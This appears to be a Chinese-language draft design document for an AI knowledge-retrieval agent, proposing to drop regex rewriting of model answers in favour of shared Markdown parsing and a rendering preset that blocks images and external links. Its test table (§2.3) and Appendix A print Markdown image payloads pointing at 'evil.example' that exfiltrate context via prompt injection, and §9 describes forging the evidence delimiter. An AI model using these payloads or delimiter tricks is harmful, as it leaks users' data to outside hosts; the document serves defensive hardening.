# Agent 回答文本处理：去掉正则改写，改为解析与结构化约束

> 文档版本：v0.1（草案） | 创建 2026-11-18
> 状态：**草案，S1–S8 待拍板，未开工**。本轮只做文档与代码调研，没有改代码
> 起因：版本 3 代码评估的[问题 1](./KNOWLEDGE_AGENT_V3_CODE_REVIEW.md#问题-1代码下标被当成引用编号删掉)：代码下标被当成引用编号删掉。顺着它排查，对模型回答做正则检查和替换的地方不止这一处
> 范围：只看本次 AI Agent 相关模块，即 `ai-service` 的 Harness、知识检索 Agent 与检索层，`services/ai`，`apps/web` 的 AI 功能（`features/ai`、`lib/ai`，以及只给 AI 回答用的新渲染预设）。
> 原有笔记模块不在范围内，也不改动：笔记编辑与预览用的预设、`packages/editor-core`、`services/note`、索引对笔记正文的解析
> 关联：[总体方案 §3.6 / §3.8](./AI_REFACTOR_PLAN.md#36-control身份策略与注入防护)、[知识检索方案 §8.2](./KNOWLEDGE_RETRIEVAL_PLAN.md#82-引用)、
> [版本 3 方案 §4.5](./KNOWLEDGE_AGENT_V3_PLAN.md#45-校验分级)、[Agent 运行过程展示方案](./AGENT_TRACE_VIEW_PLAN.md)
> 依据：AI Agent Handbook（白皮书），本机 `D:\code\ai-agent-handbook`，提交 `754ec0c`（与调研时相同）

## 1. 摘要

**问题**

知识检索 Agent 的回答是模型写的 Markdown。现在后端用 8 处正则检查和改写它：识别引用编号、删掉无效编号、删图片和外链、截断澄清问题。
前端再用 1 处正则给引用编号加链接。这些正则看的是原始字符串，分不清哪里是代码、哪里是链接、哪里是正文，于是三类错误同时存在（§2.3 实测）：

- **误伤**：代码示例里的 URL、下标、HTML 和 Markdown 写法被删改；
- **漏拦**：两种合法的 Markdown 图片写法能躲过过滤，前端照样渲染成 `<img>`，图片地址可以把上下文里的内容带到外部；
- **两端不一致**：后端把行内代码里的 `[1]` 算作有效引用，前端却不给它加链接，引用列表里多出一条正文里找不到的来源。

根因只有一个：后端用正则猜「这段 Markdown 渲染出来是什么」，而真正决定渲染结果的是前端的 markdown-it 和 TipTap schema，两套语法对不上。
继续收紧正则解决不了问题，§2.4 有一个收紧之后反而更糟的例子。

**原则**

1. 模型写的原文只保存、不改写。后端不再对回答做正则替换。
2. 安全约束放在最终渲染的地方，用 schema 强制：AI 回答的渲染器里没有图片节点，链接只放行站内地址。
3. 必须从正文里识别的东西（引用编号的位置）在解析阶段识别。前后端用同源的 Markdown 解析器、同一条规则、同一份共享用例。
4. 能用结构化字段表达的，不从文本里猜。
5. 不再新增文本补丁型规则，例如按问号截断、按标题补引用、默认剥离标签。

**改动一览**

| # | 改动 | 现状 | 本方案 |
|---|---|---|---|
| 1 | 外链与图片 | 后端 5 处正则删除或解包；前端借用笔记的 `readonly` 预设渲染回答，图片和外链都会生效 | 新增 AI 回答专用预设：没有图片节点，链接只放行站内路径，外链显示为不可点击的文字。后端 5 处正则删除 |
| 2 | 引用编号识别 | 后端对原始字符串跑正则，前端在文字节点上跑另一条正则 | 两端都在解析阶段用同一条行内规则识别，代码、公式、链接里的都不算 |
| 3 | 无效编号 | 后端用正则从全文删除 | 后端只判定、不改写；前端根据引用列表和 `CITATIONS_REMOVED` 标注不显示无效编号（S1） |
| 4 | 无证据且没调用工具的回答 | 照样识别引用编号，代码下标会被当成伪造引用删掉 | 跳过识别，这种情况下不可能有合法引用 |
| 5 | 澄清问题 | 按问号截到第一个 | 不截断（S5） |
| 6 | 检索高亮 | 用正则去掉 `<em>` | ES 请求不加高亮标签 |
| 7 | 历史摘要标记 | `startswith("[历史摘要]")` | 消息带结构化字段 |

**不变**：引用事件与回答标注的结构；版本 3 的校验分级与修复次数；指令里「不输出外部链接或图片」这一条；`services/ai` 的存储、接口与 OpenAPI；
笔记模块的全部预设与 `packages/editor-core`。

## 2. 现状

### 2.1 已实现代码

Python 8 处，都在 [response.py](../../ai-service/agents/knowledge_retrieval/response.py)；前端 1 处；Java 没有。

| # | 位置 | 做什么 | 问题 |
|---|---|---|---|
| R1 | [response.py:140](../../ai-service/agents/knowledge_retrieval/response.py#L140) | 用 `(?<!\\)\[(\d+)\]` 找引用编号 | 代码下标也被算进去。有证据时，行内代码 `arr[1]` 会被当成对 E1 的有效引用，`MISSING_CITATION` 因此不再触发 |
| R2 | [response.py:156](../../ai-service/agents/knowledge_retrieval/response.py#L156) | 用同一个正则从全文删除无效编号 | 已知缺陷：`lst[0]` 变成 `lst` |
| R3 | [response.py:62](../../ai-service/agents/knowledge_retrieval/response.py#L62) | 删 Markdown 图片和 `<img>` | 误伤讲语法的行内代码；有两种写法能漏过去（§2.3）。`<img>` 分支本来就多余：前端配置了 `html: false`（[markdown.ts:21](../../packages/editor-core/src/markdown.ts#L21)），裸 HTML 只会显示成文字 |
| R4 | [response.py:70](../../ai-service/agents/knowledge_retrieval/response.py#L70) | Markdown 外链只留文字 | 行内代码里的链接写法也被改掉 |
| R5 | [response.py:76](../../ai-service/agents/knowledge_retrieval/response.py#L76) | HTML `<a>` 外链只留文字 | 多余，理由同上；唯一的效果是改坏代码块里的 HTML 示例 |
| R6 | [response.py:80](../../ai-service/agents/knowledge_retrieval/response.py#L80) | 删 `<https://…>` | 同 R4 |
| R7 | [response.py:81](../../ai-service/agents/knowledge_retrieval/response.py#L81) | 删裸 URL，连文字一起删 | 删坏代码块里的命令和代码；不认识 `//host/…` 这种协议相对地址，前端的 linkify 照样会把它变成链接 |
| R8 | [response.py:111](../../ai-service/agents/knowledge_retrieval/response.py#L111) | 澄清问题按 `?` 或 `？` 截到第一个 | 截断悄悄发生、不进修复；行内代码里的问号也算 |
| R9 | [citation-editor.ts:28](../../apps/web/src/lib/ai/citation-editor.ts#L28) | 给正文里的 `[n]` 加链接 | 已经跳过代码块、行内代码和现有链接，但规则和 R1 不同（§2.4） |

R3–R7 由 `filter_external_links_and_images` 统一执行，同时作用于回答正文（[response.py:131](../../ai-service/agents/knowledge_retrieval/response.py#L131)）
和澄清问题（[response.py:110](../../ai-service/agents/knowledge_retrieval/response.py#L110)）。

**边缘 2 处**

| # | 位置 | 说明 | 结论 |
|---|---|---|---|
| R10 | [query_analysis.py:18](../../ai-service/retrieval/query_analysis.py#L18) | 对模型生成的 `kb_search` 查询词判断有没有引号、长数字、代码样式，据此决定全文与语义两个检索通道的权重 | 保留：判断错了只改变排序权重，不改内容；模型还能用 `mode` 参数覆盖（[args.py:53](../../ai-service/tools/knowledge/args.py#L53)） |
| R11 | [builder.py:193](../../ai-service/harness/context/builder.py#L193) | 用 `startswith("[历史摘要]")` 判断一条历史是不是摘要，前缀由 [compaction.py:52](../../ai-service/harness/context/compaction.py#L52) 加上 | 改用结构化字段。用户输入恰好以这几个字开头也会被误标，但只影响 Trace 里的标签 |

**同类、但处理的不是模型文本**：R12，[response.py:221](../../ai-service/agents/knowledge_retrieval/response.py#L221) 用正则去掉 ES 高亮的 `<em>`。
笔记正文里本来就写着 `<em>` 的，也会被一起去掉。

### 2.2 未实现的方案

| # | 出处 | 内容 |
|---|---|---|
| P1 | [Agent 运行过程展示方案 §5.3](./AGENT_TRACE_VIEW_PLAN.md#53-模型接入层) | `think_tag` 格式：从正文里切出 `<think>…</think>` |
| P2 | 同上 [§10](./AGENT_TRACE_VIEW_PLAN.md#10-顺带发现的问题) 第 4 条 | 没配置推理格式时，是否默认剥离 `<think>`（留待 M17.0 定） |
| P3 | 同上 [§3.2](./AGENT_TRACE_VIEW_PLAN.md#32-对话视图的过程区)、[§5.7](./AGENT_TRACE_VIEW_PLAN.md#57-对话界面) | 思考行收起时的预览「去掉 `**`」 |
| P4 | [版本 3 方案 §4.5](./KNOWLEDGE_AGENT_V3_PLAN.md#45-校验分级) | 可选的自动补注：回答里出现了结构化行的标题、却没写编号时，由 Harness 补上引用 |
| P5 | [版本 3 方案 §6](./KNOWLEDGE_AGENT_V3_PLAN.md#6-顺带发现的问题) 第 6.5 条 | 「未找到」改为采用模型给的说明，并「过滤外链、去掉引用编号」 |
| P6 | [总体方案 §3.2](./AI_REFACTOR_PLAN.md#32-execution任务循环) | 把「敏感内容过滤」作为中间件，方案没有定义具体做法 |

另有两处已经在 [Agent 运行过程展示方案 §5.2](./AGENT_TRACE_VIEW_PLAN.md#52-权限模型) 否决：按格式遮挡思考里的引用编号、按标题黑名单遮挡。否决理由和本方案一致。

### 2.3 实测

方法：直接调用 `filter_external_links_and_images` 与 `validate_answer`。漏拦的两条，再用仓库安装的 markdown-it 14.3.1 按 `MarkdownBridge` 的选项
（`html: false`、`linkify: true`）渲染一遍。复现代码见[附录 A](#附录-a复现方法)。

| # | 模型输出 | 现在的结果 |
|---|---|---|
| 1 | 代码块里的 `curl -s https://api.example.com/v1/items` | 只剩 `curl -s`，URL 被删 |
| 2 | 行内代码 `requests.get("https://example.com/api")` | 只剩 `requests.get("`，反引号不再成对 |
| 3 | 讲 Markdown 语法时，行内代码里的链接和图片写法 | 链接写法只剩 `文字`，图片写法变成空的行内代码 |
| 4 | 代码块里的 `<a href="https://…"><b>首页</b></a>` 和 `<img …>` | 只剩 `首页`，`<img>` 整行消失 |
| 5 | 正文 `Python 安装包在 www.python.org 下载` | 网址连同文字一起消失 |
| 6 | 澄清问题「你是指 Kotlin 的 `String?` 类型吗？」 | 截在 `String?` 的问号处，留下半个反引号 |
| 7 | 澄清问题「你指的是课程 A 的期末复习？还是课程 B 的？」 | 「还是课程 B 的」被丢掉 |
| 8 | 有证据 E1 时的行内代码 `arr[1]` | 被当成对 E1 的有效引用，`MISSING_CITATION` 不再触发 |
| 9 | `![a [b] c](//evil.example/x.png?d=…)` | 原样保留，markdown-it 渲染成 `<img src="//evil.example/x.png?d=…">` |
| 10 | `![x]` 加一行 `[x]: //evil.example/a.png?d=…` | 原样保留，同样渲染成 `<img>` |

第 9、10 行的后果：

- AI 回答现在借用笔记的 `readonly` 预设渲染（[message-item.tsx:76](../../apps/web/src/features/ai/components/message-item.tsx#L76)、[citation-answer.tsx:47](../../apps/web/src/features/ai/components/citation-answer.tsx#L47)）。
  这个预设注册了图片节点（[readonly.ts:49](../../apps/web/src/components/editor/presets/readonly.ts#L49)）。
- TipTap 3.31 的图片节点接受任何不以 `data:` 开头的地址，仓库里也没有配置 CSP。
- 所以只要有人在用户可读的知识库里写入注入文字，并且模型照做，浏览器就会把内容发到外部地址。
  总体方案 [§3.6](./AI_REFACTOR_PLAN.md#36-control身份策略与注入防护) 注入防护第 3 条要防的正是这件事。

### 2.4 根因与两端不一致

- 后端的正则作用在原始字符串上，不知道代码块、行内代码、链接、公式的边界。前端渲染用的是 markdown-it 加 TipTap schema。
  两套语法认出来的「图片」「链接」「引用」不是同一批。
- 引用编号在前后端各识别一次，规则不同：
  - 行内代码里的 `[1]`：后端算有效引用，前端不加链接；
  - 转义的 `\[1\]`：后端不算；前端解析后看到的是文字 `[1]`，引用列表里有 1 号时会给它加链接。
- 版本 3 代码评估建议的收紧写法 `(?<![\w\]\\])\[(\d+)\]` 有两个副作用，已实测：
  - Python 3 的 `\w` 默认包含中文，「知识库[1]」「Java 学习[1]。」都识别不到，而这正是最常见的写法；
  - 排除前一个字符是 `]` 的情况，会漏掉连写「[1][2]」里的第二个编号。真实回答里出现过这种写法（[附录 B](#附录-b真实回答里的引用写法)）。

  JS 的 `\w` 只含 ASCII，所以同一条正则在两端的结果也不一样。这说明继续收紧正则不是出路。

### 2.5 一个推断（未复现）

引用编号只在单次运行内有效（`E<n>` 按本次运行的顺序分配），而历史回答会带着 `[n]` 原样回到上下文，
见 [AgentRunServiceImpl.java:633](../../services/ai/src/main/java/com/anynote/ai/service/impl/AgentRunServiceImpl.java#L633) 的 `toHarnessHistory`。
模型照抄上一轮的 `[1]` 时，本轮的 E1 可能是另一条证据，校验会把它当成有效引用。

## 3. 白皮书依据

| 章节 | 要点 | 对本方案的约束 |
|---|---|---|
| §6.4.4 | Guardrail 不应是唯一安全边界；能确定编码的权限和资源限制用 Policy 与 Sandbox 落实；对数据外传单独授权 | 外部图片与链接由渲染器的 schema 确定性地拒绝，不靠过滤文本 |
| §6.2.2 | 输入用明确的类型、枚举和边界，避免让模型拼接任意请求；Verifier 查询结构化结果，不必解析自然语言回执 | 澄清选项、「未找到」说明、历史摘要标记都走结构化字段 |
| §4.6.2 | 结构验证靠 Schema、必填字段和格式；Verifier 返回结构化缺口、失败证据和可修复性 | 引用校验保留结构化缺口，只把「识别」换成解析 |
| §6.6.2 | 回归集要同时包含原失败用例、相邻正常用例和安全对抗用例；模型升级后删除已经失效或阻碍新模型的补偿逻辑 | 共享用例覆盖代码、公式、链接和绕过写法；按问号截断、正则删外链这类补丁属于该清理的补偿逻辑 |

## 4. 设计

### 4.1 AI 回答专用渲染预设

在 `apps/web` 新增预设 `aiAnswer`，只给 AI 回答用。

| 项 | `readonly`（笔记预览，不变） | `aiAnswer`（新增） |
|---|---|---|
| 图片节点 | 有 | **没有**：Markdown 图片的所有写法都不会变成 `<img>` |
| 链接 | 链接扩展的默认校验：放行 http、https、mailto 等常见协议和相对地址，外部链接可以点 | 用链接扩展的 `isAllowedUri`，只放行 `/` 开头、不以 `//` 开头的站内路径。不放行的链接在解析阶段就不生成，文字保留 |
| 引用 | 没有 | 新增引用节点，在解析阶段识别（§4.2） |
| 双链、高亮 `==`、下划线、提示块、AI 块 | 有 | 去掉。回答用不到；少一种语法，前后端就少一处要对齐 |
| 代码高亮、公式、表格、任务列表、删除线 | 有 | 保留 |

- TipTap 3.31 链接扩展的 `parseHTML` 和 `renderHTML` 都会调用 `isAllowedUri`。Markdown 链接、`<…>` 自动链接、linkify 生成的链接都要经过这道检查。
  引用链接也是站内路径，同样放行。
- `MessageItem` 与 `CitationAnswer` 合并成一个回答组件：不管有没有引用，都用 `aiAnswer` 渲染。现在「没有引用时直接用 `readonly`」的分支去掉。
- 流式期间仍显示纯文本、不渲染 Markdown，这一点不变。
- 改动面：新文件放在 `components/editor/presets/ai-answer.ts` 和 `components/editor/extensions/ai-citation.ts`。编辑器公共代码只有三处增量：
  - 预设名（[types.ts:5](../../apps/web/src/components/editor/presets/types.ts#L5)）；
  - 预设注册表（[index.ts:18](../../apps/web/src/components/editor/presets/index.ts#L18)）；
  - 只读判断（[tiptap-editor.tsx:98](../../apps/web/src/components/editor/core/tiptap-editor.tsx#L98)）。这里不把 `aiAnswer` 算作只读，就会挂上工具栏。

  笔记在用的四个预设不改。`packages/editor-core` 不改，不涉及 `EDITOR_SCHEMA_VERSION`。
- 后端删除 R3–R7 和 `filter_external_links_and_images`。回答原文里的外部链接和图片写法照常入库，由渲染器中和。

**契约变化**

- 回答正文不再在服务端过滤外链与图片，所有展示 Agent 回答的地方都必须用 `aiAnswer`，或者施加同等约束。
- 目前所有回答都经 `MessageItem` 渲染：对话页和 PDF 问答页（桌面与移动端）都用 `ChatPanel`。CLI 没有展示回答的命令，也没有「插入笔记」的入口。
- 这一条要写进 OpenSpec 提案。以后新增的展示端都要遵守，包括 Agent 运行过程展示方案里的思考行和过程说明（§4.5 的 P7）。

**可选：后端检测（S4）**

后端用同一个解析器（§4.2）统计回答里的外部图片和链接，把数量和主机名写进 `trace.verify`，不改写、不退回修复。
回答里出现外部图片，多半意味着有注入，这是值得留痕的安全信号。

### 4.2 引用编号：解析阶段识别，后端只判定

**标记规则**（两端共用，以共享用例为准）

1. 形如 `[n]`，`n` 为 1–999、不带前导零。`[0]` 不算，因为证据编号从 E1 开始。
2. 只在正文文字里识别。以下位置都不算：
   - 行内代码、代码块；
   - 行内公式、块级公式；
   - 链接文字、链接地址、自动链接；
   - 转义的 `\[1\]`。

   代码、公式和转义由解析器先行消费，引用规则看不到它们。链接文字会被递归解析，所以引用规则要判断当前是否处在链接里：
   markdown-it 14 的行内状态有 `linkLevel`（链接规则解析链接文字时加一），实施时确认 markdown-it-py 的对应版本同样提供。
3. 前一个字符是 ASCII 字母、数字、下划线或 `[` 时不算，例如 `lst[0]`、`arr[1]`、`[[1]]`。
   - 中文和全角标点后面的照常算，例如「知识库[1]」「（来源）[1]」。实现时不能用 Python 的 `\w`。
   - 前一个字符是 `]` 时按第 5 条处理。
4. 后一个字符是 `(` 时不算，那是 Markdown 链接 `[1](…)`。后一个字符是 `[` 时，只有后面也是 `[数字]` 才算，否则按引用式链接处理。
5. 连写的 `[1][2]` 作为一组判断：
   - 第一个按第 3 条算引用，整组都算；
   - 第一个不算（例如 `m[1][2]`），整组都不算。

真实数据的支撑见[附录 B](#附录-b真实回答里的引用写法)：71 处真实编号里，前一个字符是 ASCII 字母或数字的有 0 处，连写 `[1][2]` 有 2 处。

第 3 条会漏掉「英文单词紧跟编号」的写法，例如 `Elasticsearch[1]`。代价比较轻：漏识别只会触发一次修复，或者给回答加上 `UNSOURCED` 标注，
内容不会被改坏；反过来，误把正文里没加反引号的 `arr[1]` 当成引用，既会显示错的来源，又可能删坏内容。
被第 3、4 条排除的候选数写进 `trace.verify`，评测时据此判断要不要放宽。

**后端（Python）**

- 新增 `agents/knowledge_retrieval/citations.py`：用 markdown-it-py（markdown-it 的 Python 移植）解析回答。
  - 启用与 `aiAnswer` 相同的语法：CommonMark、表格、删除线、linkify、公式。
  - 公式规则照搬 [editor-core 的 math.ts](../../packages/editor-core/src/extensions/math.ts#L14)，不用 mdit-py-plugins 的 dollarmath，以免两边判定不同。
  - 注册引用行内规则，按出现顺序返回编号，同时返回被规则排除的候选数。
- `validate_answer` 的改动：
  - 不再调用 `filter_external_links_and_images`；
  - 没有证据、且 `tool_calls == 0` 时跳过识别；
  - 编号核对、原文核对、缺口与标注逻辑不变；
  - 回答原样返回（只去掉首尾空白），不再 `sub`。
- `ValidatedAnswer`、`citation` 事件、`answerNotices` 的结构都不变。

**前端**

- `aiAnswer` 预设里注册一个只给 AI 回答用的引用节点。
  - 解析规则用 editor-core 已经导出的 `registerMdPlugin` 注册，不改 editor-core。
  - 规则内容与后端的行内规则一致。
- 回答组件拿到引用列表和标注后，逐个处理引用节点：
  - 编号在引用列表里：显示为站内链接，沿用 `citationHref`；
  - 不在列表里，且消息带 `CITATIONS_REMOVED`：不显示；
  - 其余情况：原样显示 `[n]`。
- 删除 `linkCitationReferences` 在文字节点上跑正则的做法（[citation-editor.ts](../../apps/web/src/lib/ai/citation-editor.ts)）。

两端用同一条规则，所以「正文里是引用、但不在引用列表里」的编号，正好就是后端判定无效的那一批。前端据此不显示它们，效果等同于现在后端的删除，
但后端不再改动原文（S1）。

**共享用例**

- 一份 JSON，放在 `ai-service/tests/fixtures/citation-markers.json`。pytest 直接读；web 的 vitest 按相对路径读。
  这与 `access-matrix.json` 由 note 提供、Python 测试读取同一文件的做法一致。
- 至少覆盖以下情况：

| 输入 | 识别出的编号 |
|---|---|
| `知识库[1]` | 1 |
| `共 3 篇笔记[1][2]：` | 1、2 |
| `**3 篇笔记**[1]` | 1 |
| `[1] 该条来自 kb_list 的返回结果。` | 1 |
| `倒排索引（Inverted Index）[1]` | 1 |
| 表格单元格、引用块、列表项里的 `[2]` | 2 |
| `` 用 `lst[0]` 取第一个 `` | 无 |
| 代码块里的 `m[1][2]` | 无 |
| 正文里没加反引号的 `m[1][2]`、`arr[1]` | 无 |
| `[0]`、`[01]`、`[1000]` | 无 |
| `[1](/notes/1/2)` | 无（链接） |
| `[参见 [1]](/notes/1/2)` | 无（链接文字） |
| `\[1\]` | 无 |
| `$a[1]$` | 无（公式） |
| `[[1]]` | 无 |
| `https://example.com/a[1]` | 无（linkify 生成的链接） |

### 4.3 需澄清：不截断

- 删掉按问号截断（R8），只保留「问题为空」的检查。问题文字由 `aiAnswer` 渲染，里面的链接同样会被中和。
- 「只问一个问题」靠指令约束。如果确实需要让模型给出选项，就给 `agent_finish` 加一个结构化的 `options` 字段，
  并在界面上显示成可点的选项（S5）。

### 4.4 其余已实现项

| # | 处理 |
|---|---|
| R10 | 保留。在本方案里登记为「接受的启发式规则」：它只作用于模型生成的检索词，决定的是排序权重 |
| R11 | `ChatMessage` 加一个 `summary` 布尔字段，由压缩器设置，`ContextBuilder` 按字段判断。给模型看的「[历史摘要]」前缀文字可以保留 |
| R12 | [index_reader.py:110](../../ai-service/retrieval/index_reader.py#L110) 的高亮请求把 `pre_tags`、`post_tags` 设成空串，删掉 `HIGHLIGHT_TAG_PATTERN`。实施时在 ES 8.7 上确认它接受空串；不接受就改用私用区字符作哨兵，用 `str.replace` 去掉 |

### 4.5 未实现方案的处理意见

| # | 意见 |
|---|---|
| P1 | 保留，但加约束：只在逻辑模型配置为 `think_tag` 时启用；只认本轮回复开头（去掉前导空白后）的 `<think>`，到第一个 `</think>` 为止；用流式状态机处理跨片段的标签；正文其他位置的 `<think>` 一律当普通文字；流结束时仍未闭合，就整段算思考、本轮没有正文，走「没有正文」的既有处理 |
| P2 | 不默认剥离。回答里讲 HTML、XML 或推理模型时，正常内容会被误删 |
| P3 | 预览直接取原文首行，不做替换。设计坚持去掉 Markdown 记号的话，在已加载的解析器上取纯文本，不写 `replace(/\*\*/g, "")` |
| P4 | 放弃。标题常常是「Java」「复习」这类常用词，会在代码和无关句子里补出看起来很精确的假引用。需要的话，在回答下方按证据列出「本次查阅的来源」，不往正文里插编号 |
| P5 | 结构化生成：查过哪些范围、用过哪些工具和查询词，由 Harness 从本次运行的工具记录生成；模型只在 `agent_finish` 里填一个可选的建议字段。新增文案逐条确认（S6） |
| P6 | 总体方案 §3.2 去掉「敏感内容过滤」，或者改写成「输出约束由渲染层执行，见本方案」。用户令牌和模型 Key 本来就不进上下文 |
| P7（新增约束） | Agent 运行过程展示方案 §5.7 里，思考行和过程说明在块结束后渲染 Markdown，必须用 `aiAnswer`。否则推理文本里的外部图片同样会加载，而那份方案明确不对思考文本做遮挡 |

### 4.6 历史回答里的编号（先复现）

- 先用脚本化模型写一条复现用例：历史里有带 `[1]` 的回答，本轮登记的 E1 是另一条证据，模型照抄 `[1]`。
- 复现成立再改。改法不碰历史原文：Java 把每条历史回答的引用（编号与标题）随历史一起交给 Python，历史层附一段结构化说明
  「这条回答里的编号只对当时有效：[1] 标题……」，指令里写明本轮只能引用本轮工具结果的 `evidenceId`。

## 5. 实施拆分

Python 与前端分开提交，每一步先写复现用例再改代码。Java 不改。

| 步骤 | 内容 | 主要文件 | 测试 |
|---|---|---|---|
| 1 | 共享用例 | `ai-service/tests/fixtures/citation-markers.json` | 由步骤 2、3 消费 |
| 2 | 前端：`aiAnswer` 预设、引用节点、合并回答组件，删除文字节点上的正则 | `components/editor/presets/ai-answer.ts`（新）、`components/editor/extensions/ai-citation.ts`（新）、`presets/index.ts`、`presets/types.ts`、`core/tiptap-editor.tsx`、`features/ai/components/message-item.tsx`、`citation-answer.tsx`、`lib/ai/citation-editor.ts` | Vitest：共享用例；§2.3 第 9、10 行不产生 `<img>`；外链变成文字；站内链接和引用链接可点；带 `CITATIONS_REMOVED` 时不显示未知编号；不带时原样显示；笔记 `readonly` 的既有用例不变 |
| 3 | Python：解析器识别、删掉改写与截断、跳过规则、高亮标签、历史摘要字段 | `agents/knowledge_retrieval/citations.py`（新）、`response.py`、`retrieval/index_reader.py`、`harness/models.py`、`harness/context/builder.py`、`harness/context/compaction.py`、`requirements/online.in` 与锁文件 | pytest：共享用例；§2.3 第 1–8 行原文不变；行内代码 `arr[1]` 不再压掉 `MISSING_CITATION`；无证据且没调用工具时不识别；改写锁住旧行为的用例（见下） |
| 4 | 可选：后端检测外部资源，写进 Trace（S4） | `response.py`、`harness/trace/` | pytest |
| 5 | 文档与契约 | OpenSpec 提案 `.claude/openspec/changes/<日期>-agent-answer-rendering.md`；总体方案 §3.2、§3.6 第 3 条、§3.8；知识检索方案 §8.2；版本 3 方案 §1「不变」、§4.5、§6.5、§8；Agent 运行过程展示方案 §5.3、§5.7、§10；`docs/changelist/`；本页状态 | — |
| 6 | 真实模型重放 | 做法同版本 3 的记录 | 版本 3 的八类问题各 3 次，引用数与版本 3 对比；编程类 3 题、带注入文字的文档 1 题，各 3 次 |

**要改写的既有用例**：`test_knowledge_retrieval_agent.py` 里有两类。

- 锁住改写结果的：第 103、221 行断言无效编号已从正文删除。
- 锁住截断或过滤的：
  - `test_clarification_signal_keeps_at_most_one_question`；
  - `test_output_filter_removes_images_and_external_links_only`；
  - `test_output_filter_removes_reference_images_and_html_external_anchors`；
  - `test_multiple_clarification_questions_are_truncated_without_retry_issue`。

前端是 `citation-editor.test.ts` 的三条，以及 `message-item.test.tsx` 里「用 readonly 编辑器渲染」那一条。

**上线顺序：前端先于 Python。**

- 前端先上线时：后端还在删除和过滤，新渲染器没有东西可隐藏，行为不变。
- 反过来，如果 Python 先上线：旧前端仍用带图片节点的 `readonly` 渲染没过滤的回答，§2.3 第 9、10 行的风险会直接暴露。

依赖：markdown-it-py 和 linkify-it-py（都是 MIT 许可），加进 `requirements/online.in`，重新生成 Linux 与 Windows 两份锁文件。

## 6. 测试与验收

- §2.3 的十条都修复：
  - 第 1–5 行原文保留，代码完整，网址显示为不可点的文字；
  - 第 6、7 行不截断；
  - 第 8 行不算引用，`MISSING_CITATION` 照常触发；
  - 第 9、10 行不渲染成图片，浏览器不向外部地址发请求。
- 共享用例在 pytest 和 vitest 里都通过，两者都在默认单测流程里。
- 用新规则离线复算本机 `tmp/knowledge-agent-v3/` 里 51 条真实回答：识别出的编号与当时的引用一致。这一项不需要调用模型。
- 版本 3 八类问题的真实重放：结果类型和引用数与版本 3 的记录一致。
- 笔记模块回归：`readonly` 等预设的既有用例全部通过，笔记预览照常显示图片和外链。
- `pnpm --filter web bundle:budget` 通过。新预设比 `readonly` 少几个扩展，不应变大。
- `services/ai` 没有代码改动。

## 7. 风险与取舍

| 风险 | 应对 |
|---|---|
| 对 AI 回答来说，渲染层成了外部资源的唯一防线 | 全站只有一个回答组件；单测断言对话页用的是 `aiAnswer`；OpenSpec 写明契约；新增展示端必须复用，包括思考行和过程说明；可选的后端检测负责留痕 |
| 上线顺序弄反 | 前端先上线；合并 Python 改动前确认前端已经部署 |
| 两端解析器不一致（markdown-it 14 与 markdown-it-py 的版本差异、语法扩展） | `aiAnswer` 只保留两端都实现了的语法；共享用例进两边的默认单测 |
| 第 3 条规则漏识别「英文单词或数字紧跟编号」 | 真实数据里 71 处为 0；被排除的候选记进 Trace，评测时复核；漏识别的代价是一次修复或 `UNSOURCED` 标注，不会改坏内容 |
| 正文里和引用同形的写法，例如空格后的 `[2]` | 这是 `[n]` 语法本身的歧义，与现状相同。评测发现频率高时，再考虑换成更不容易冲突的标记，例如 `【1】`；那需要同时改指令和两端规则，并重放真实模型 |
| 外链文字仍然可见，用户可能手动访问 | 需要用户主动复制访问，风险低；与 S2 一起拍板 |
| 历史消息里保留着无效编号 | 只影响后续轮次的上下文，与 §4.6 一起观察 |
| 只含外部图片的回答显示为空白 | 概率低；后端检测（S4）能发现 |
| 新增依赖 | 都是 MIT 许可、体积小；锁文件随同提交 |

## 8. 待拍板

| # | 问题 | 推荐 | 备选 |
|---|---|---|---|
| S1 | 无效引用编号由谁移除 | 前端渲染时不显示，依据是引用列表和 `CITATIONS_REMOVED` 标注；后端不改写原文 | 后端按解析器给出的位置精确删除。这需要把行内规则里的位置换算成全文偏移，在引用块、列表、表格里换算复杂 |
| S2 | 外部链接怎么显示 | 保留文字、不可点击 | 连文字一起隐藏（现状） |
| S3 | 外部图片怎么显示 | 不渲染 | 显示占位文字「外部图片未显示」（新增文案，需确认） |
| S4 | 后端要不要检测外部图片和链接 | 检测，只写 Trace，不退回、不改写 | 不检测；或者检测后退回修复一次，多一轮模型调用 |
| S5 | 澄清问题 | 本批只去掉截断 | 同时给 `agent_finish` 加 `options` 字段，并在界面上显示成可点的选项 |
| S6 | 「未找到」的说明（版本 3 §6.5） | 结构化生成：事实取自运行记录，模型只填建议字段 | 维持固定文案（现状） |
| S7 | 自动补注（版本 3 §4.5 的可选项） | 放弃 | 保留为可选项，按评测结果再定 |
| S8 | 运行过程展示方案里的 P1、P2、P3、P7 | 按 §4.5 的意见并入该方案，随它的 M17.0 一起确认 | 等该方案拍板时另定 |

## 9. 顺带发现

1. **证据定界符可以伪造。** `<untrusted-evidence>` 是固定字符串，[builder.py:208](../../ai-service/harness/context/builder.py#L208) 和 [builder.py:294](../../ai-service/harness/context/builder.py#L294)
   包装证据和工具结果时，没有转义正文里同名的结束标签。文档里写一个结束标签，就能让后面的文字看起来在定界符外面。
   - 这个问题出在输入侧，不属于本方案的统计范围。
   - 建议另行处理：改成每次运行随机生成的定界符，或者包装前转义正文里的定界符。
2. **AI 回答里的 `$` 会被当成公式。** 行内公式规则是 `$…$`，正文里的 `从 $5 涨到 $10`，或者没加反引号的 `$HOME 和 $PATH`，
   都会被渲染成公式。这是渲染方言的歧义，不是正则改写的问题，本方案不处理。如果评测里常见，可以考虑在 `aiAnswer` 里去掉行内公式，只保留块级公式。

## 附录 A：复现方法

后端过滤与校验。在 `ai-service` 目录下，用 `venv` 里的 Python 3.12 执行：

```python
from agents.knowledge_retrieval.agent import AgentFinishArgs
from agents.knowledge_retrieval.response import filter_external_links_and_images, validate_answer
from harness.models import EvidenceItem

filter_external_links_and_images('用 `requests.get("https://example.com/api")` 发请求')
# '用 `requests.get(" 发请求'
filter_external_links_and_images("![a [b] c](//evil.example/x.png?d=SECRET)")
# 原样返回

evidence = [EvidenceItem(evidence_id="E1", source_type="kb", source_id="kb:1",
                         content="笔记 3 篇", title="Java 学习", structured=True)]
result = validate_answer(AgentFinishArgs(outcome="ANSWERED", answer="取第二个元素用 `arr[1]`。"),
                         evidence, None, tool_calls=1)
# result.citations 含 E1，result.issues 为空
```

前端渲染。在仓库根目录用 Node 执行，选项与 `MarkdownBridge` 相同：

```js
const MarkdownIt = require("./node_modules/.pnpm/markdown-it@14.3.1/node_modules/markdown-it");
const md = new MarkdownIt({ html: false, linkify: true, breaks: false });
